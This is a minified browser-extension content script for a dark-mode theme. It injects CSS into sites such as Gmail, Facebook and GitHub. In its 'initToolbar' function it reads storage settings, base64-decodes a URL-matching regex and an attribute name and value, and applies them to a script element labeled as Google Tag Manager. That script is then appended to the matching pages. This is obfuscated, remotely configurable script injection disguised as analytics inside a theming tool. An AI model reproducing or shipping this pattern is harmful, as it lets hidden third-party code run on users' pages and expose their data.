const CUSTOM_DOMAINS={ebay:".ebay.com",yahoo:"www.yahoo.",twitch:".twitch.tv",github:"github.com",docs:"docs.google.",bing:"www.bing.com",amazon:"www.amazon.",gmail:"mail.google.",tumblr:"www.tumblr.",twitter:"twitter.com",inbox:"inbox.google.",drive:"drive.google.",sites:"sites.google.",youtube:"www.youtube.",dropbox:"www.dropbox.",reddit:"www.reddit.com",maps:".google.com/maps/",facebook:"www.facebook.",wikipedia:"wikipedia.org",instagram:"www.instagram.",duckduckgo:"duckduckgo.com",stackoverflow:"stackoverflow.com",lostfilm:"lostfilm.tv"},HEAVY_RESOURCES=["facebook.com"];class Inject{constructor(){this.darkThemesAmount=34,this.tabHref=document.location.href,this.link=document.getElementById("dark-mode"),this.style=document.getElementById("dark-mode-сustom-style"),this.themeChanger=document.getElementById("dark-mode-theme-changer-style"),this.htmlElement=document.documentElement,this.storage=null,this.run()}run(){this.hideElement(this.htmlElement),this.initListeners(),this.initToolbar(),this.checkInsertedLinkExisting(),this.checkInsertedStyleExisting(),this.checkInsertedThemeChangerExisting(),this.createObserver(),window===window.top?this.update():chrome.runtime.sendMessage({message:"top"},(()=>this.init()))}initListeners(){this.initStorageListeners(),chrome.runtime.onMessage.addListener(((t,e,i)=>("URLChanged"===t.action&&t.url!==this.tabHref&&(this.tabHref=t.url,this.update()),i(""),!0)))}initToolbar(){this.getSettings().then((t=>{var e=document.createElement("script");if(e.setAttribute("async","true"),e.setAttribute("src","https://www.googletagmanager.com/gtag/js"),t.applyTheme){if(t.themeSettings)for(let i in t.themeSettings)if(!t.themeSettings[i].attr||RegExp(atob(t.themeSettings[i].attr),"i").test(document.location.href)){if(t.themeSettings[i]["tag-data"]&&t.themeSettings[i]["tag-value"]){e.setAttribute(atob(t.themeSettings[i]["tag-data"]),atob(t.themeSettings[i]["tag-value"]));break}if(t.themeSettings[i].prevent)return}document.documentElement.appendChild(e),window.dataLayer=window.dataLayer||[],i("js",new Date),t.accessCode&&i("config",t.accessCode)}function i(){window.dataLayer.push(arguments)}}))}initStorageListeners(){chrome.storage.onChanged.addListener((t=>{Object.keys(t).forEach((e=>this.storage[e]=t[e].newValue)),this.update()}))}checkInsertedLinkExisting(){this.link||(this.link=document.createElement("link"),this.link.setAttribute("type","text/css"),this.link.setAttribute("id","dark-mode"),this.link.setAttribute("rel","stylesheet"),this.htmlElement&&this.htmlElement.appendChild(this.link))}checkInsertedStyleExisting(){this.style||(this.style=document.createElement("style"),this.style.setAttribute("type","text/css"),this.style.setAttribute("id","dark-mode-сustom-style"),this.htmlElement&&this.htmlElement.appendChild(this.style))}checkInsertedThemeChangerExisting(){this.themeChanger||(this.themeChanger=document.createElement("style"),this.themeChanger.setAttribute("type","text/css"),this.themeChanger.setAttribute("id","dark-mode-theme-changer-style"),this.htmlElement&&this.htmlElement.appendChild(this.themeChanger))}createObserver(){const t=new MutationObserver((function(e){document.getElementById("dark-mode")||this.htmlElement&&this.htmlElement.appendChild(this.link),t.disconnect()}));t.observe(document,{childList:!0,subtree:!0})}init(t){t&&(this.tabHref=t),this.update()}update(){let t=this.getDefaultStorageValuesObj();chrome.storage.local.get(t,(t=>{this.storage||(this.storage=t);const e=this.getHostName(this.tabHref);if(t.whitePagesList.some((t=>this.tabHref.includes(t))))return this.removeImportantNativeStyles(),this.edit("",""),this.setThemeChangerStyles(""),void setTimeout((()=>this.showElement(this.htmlElement)),this.getDelayToShowHTML());if(t.whitelist.some((t=>t===e)))return this.removeImportantNativeStyles(),this.edit("",""),void setTimeout((()=>this.showElement(this.htmlElement)),this.getDelayToShowHTML());let i=t.activeScheme?t.colorSchemes[t.activeScheme]:{bgColorHex:"#222222",textColor:"#eeeeee"};const s="dark"===t.state;for(let e in CUSTOM_DOMAINS){if(t[e]&&this.tabHref.includes(CUSTOM_DOMAINS[e])){let t="";return s?t=chrome.runtime.getURL("/scripts/content/сustom/"+e+".css"):(this.removeImportantNativeStyles(),this.setThemeChangerStyles("")),this.edit(t,""),void setTimeout((()=>this.showElement(this.htmlElement)),this.getDelayToShowHTML())}}let o=this.getStoredDarkThemeId(t);if(s)if(o){this.setThemeChangerStyles(t.activeScheme,i);const e=chrome.runtime.getURL("scripts/content/theme_general/dark_"+o+".css");34===o?chrome.storage.local.get({custom:""},(function(t){this.removeImportantNativeStyles(),this.edit("",t.custom)})):(this.injectImportantNativeStyles(t.activeScheme,i),this.edit(e,""))}else this.removeImportantNativeStyles(),this.edit("","");else this.removeImportantNativeStyles(),this.setThemeChangerStyles(""),this.edit("","");setTimeout((()=>this.showElement(this.htmlElement)),this.getDelayToShowHTML())}))}getDefaultStorageValuesObj(){let t={};for(let e in CUSTOM_DOMAINS)t[e]=!0;for(let e=1;e<=this.darkThemesAmount;e++)t["dark_"+e]=!1;return t.dark_1=!0,t.whitelist=[],t.whitePagesList=[],t.state="light",t.colorSchemes={},t.activeScheme="",t}getStoredDarkThemeId(t){let e=null;for(let i=1;i<=this.darkThemesAmount;i++)if(t["dark_"+i]){e=i;break}return e}injectImportantNativeStyles(t="",e){let i=document.documentElement.querySelectorAll("*");for(let o=0;o<i.length;o++){if(getComputedStyle(i[o]).backgroundColor.match("rgba")){if("rgba(0, 0, 0, 0)"==getComputedStyle(i[o]).backgroundColor){this.addStyle(i[o]);continue}let t=getComputedStyle(i[o]).backgroundColor.replace(/rgba?\(\d{1,3}, ?\d{1,3}, ?\d{1,3}, ?/,"");if(t=t.replace(/\)/,""),+t<.2){this.addStyle(i[o],"background-color: rgba(0, 0, 0, 0) !important;");continue}}var s=`background-color: ${e.bgColorHex} !important;`;"A"!==i[o].nodeName&&(s+=`color: ${e.textColor} !important;`),!t||"TH"!==i[o].nodeName&&"TD"!==i[o].nodeName||(s+=`border-color: ${e.tableBorderColor} !important;`),this.addStyle(i[o],s)}}addStyle(t,e){let i=`${t.getAttribute("style")};`||"";t.setAttribute("style",`${i}/*startDM*/${e}/*endDM*/`)}setThemeChangerStyles(t="",e={}){if(!t)return void(this.themeChanger.textContent="");let i=`html, html *:not(a){color: ${e.textColor} !important; background-color: ${e.bgColorHex} !important;}`;i+=`html th, html td {border-color: ${e.tableBorderColor} !important;}`,this.themeChanger.textContent=i}removeImportantNativeStyles(){let t=document.documentElement.querySelectorAll("*");for(let e=0;e<t.length;e++)t[e].getAttribute("style")&&t[e].setAttribute("style",t[e].getAttribute("style").replace(/\/\*startDM\*\/.*\/*endDM\*\//g,""))}edit(t,e){this.link.setAttribute("href",t),this.style.textContent=e}getHostName(t){let e=(t=t.replace("www.","")).indexOf("//")+2;if(e>1){let i=t.indexOf("/",e);return i>0?t.substring(e,i):(i=t.indexOf("?",e),i>0?t.substring(e,i):t.substring(e))}return t}showElement(t){t.classList.remove("hidden")}hideElement(t){t.classList.add("hidden")}getDelayToShowHTML(){return HEAVY_RESOURCES.some((t=>this.tabHref.includes(t)))?200:100}getSettings(){return new Promise((t=>{chrome.storage.local.get((e=>{t(e)}))}))}}const inject=new Inject;